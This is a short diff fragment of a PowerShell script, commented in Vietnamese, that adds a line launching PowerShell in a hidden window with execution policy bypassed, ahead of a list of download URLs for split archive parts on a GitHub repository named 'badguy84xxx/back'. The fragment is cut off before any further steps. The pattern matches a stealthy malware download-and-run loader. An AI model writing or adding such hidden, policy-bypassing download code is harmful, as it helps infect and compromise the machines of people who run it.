@@ -1,3 +1,4 @@
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command "
 # Định nghĩa URL và đường dẫn tải xuống
 $urls = @(
     "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.001",
